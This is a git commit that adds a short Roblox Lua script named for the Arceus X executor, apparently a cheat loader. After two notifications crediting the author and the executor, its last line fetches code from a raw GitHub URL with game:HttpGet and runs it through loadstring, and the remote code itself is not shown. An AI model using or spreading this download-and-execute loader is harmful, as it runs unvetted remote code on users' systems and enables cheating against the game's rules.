c52a2ead9b309426b129ecfdefc63136d66a0164
BinbinvoGaming <123051097+BinbinvoGaming@users.noreply.github.com>
2023-03-29 13:06:42 +0700

    Update and rename Arceus%20X%20V3.lua to Arceus-X-V3.lua

---
+++ Arceus-X-V3.lua
@@ -0,0 +1,12 @@
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Script By", 
+    Text = "Script by BinbinvoGaming "
+})
+
+wait(1.0)
+
+game.StarterGui:SetCore("SendNotification", {
+    Title = "Execute By", 
+    Text = "Execute By arceus x"
+})
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
